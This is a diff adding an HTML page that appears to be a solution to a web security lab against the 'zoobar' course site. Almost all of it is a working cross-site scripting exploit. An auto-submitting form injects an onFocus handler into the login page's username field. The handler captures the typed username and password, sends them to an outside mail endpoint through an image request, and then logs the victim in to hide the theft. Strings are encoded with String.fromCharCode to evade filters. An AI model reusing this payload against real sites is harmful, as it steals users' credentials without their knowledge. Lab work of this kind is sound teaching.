@@ -1,0 +1,71 @@
+<html>
+    <head>
+        <title></title>
+    </head>
+
+    <body>
+        <form name=loginform method="post" id="attack_form" action="http://zoobar.org/index.php">
+            <input type="hidden" id="login_username" name="login_username" value="">
+            <input type="hidden" id="login_password" name="login_password" value="">
+            <input type="submit" name="submit_login" value="Submit">
+        </form>
+
+        <script type="text/javascript">
+
+    var username_field = document.getElementById("login_username");
+    username_field.value = "'' "
+        // Put code in onFocus event which is triggered by default on page
+        + "onFocus='"
+        // Create function with code to set for eventlistener
+        + "var ftw = function (evt) { "
+        // Prevent logging in while we do some pwnage
+        + "evt.preventDefault(); "
+        // Remove the event listener so we don't loop again
+        + "var login_button = document.getElementsByName(" + encode("submit_login") + ")[0];"
+        + "login_button.removeEventListener(" + encode("click") + ", ftw, false);"
+        // Setup and send email
+        + "var username = document.getElementsByName(" + encode("login_username") + ")[0];"
+        + "var password = document.getElementsByName(" + encode("login_password") + ")[0];"
+        + "var email_string =" 
+        + encode("http://zoomail.org/sendmail.php?") + " + " 
+        + encode("&netid=jdmack") + " + " 
+        + encode("&payload=") + " + username.value + " + encode(",") + " + password.value + " 
+        + encode("&random=" + Math.random()) + "; "
+        + "var email_image = new Image().src=email_string; "
+        // Add event listener to click the login button when the email is done sending
+        + "email_image.add_eventListener(" + encode("error") + ", login_button.click() , false);"
+        + "}; "
+        // Add an event listener for the above function
+        + "var login_button = document.getElementsByName(" + encode("submit_login") + " )[0];"
+        + "login_button.addEventListener(" + encode("click") + ", ftw, false);'"
+
+    // Execute the attack
+    document.getElementById("attack_form").submit();
+
+
+    // Encodes a string into a String.fromCharCode call
+    function encode(value) 
+    {
+        var codes = new Array();
+
+        for(var i = 0; i < value.length; i++) {
+            codes.push(value.charCodeAt(i));
+        }
+
+        return "String.fromCharCode(" + codes.join() + ")";
+    }
+
+
+    /*
+        Characters to encode
+        &
+        "
+        '
+        <
+        >
+    */
+
+        </script>
+    </body>
+</html>
+
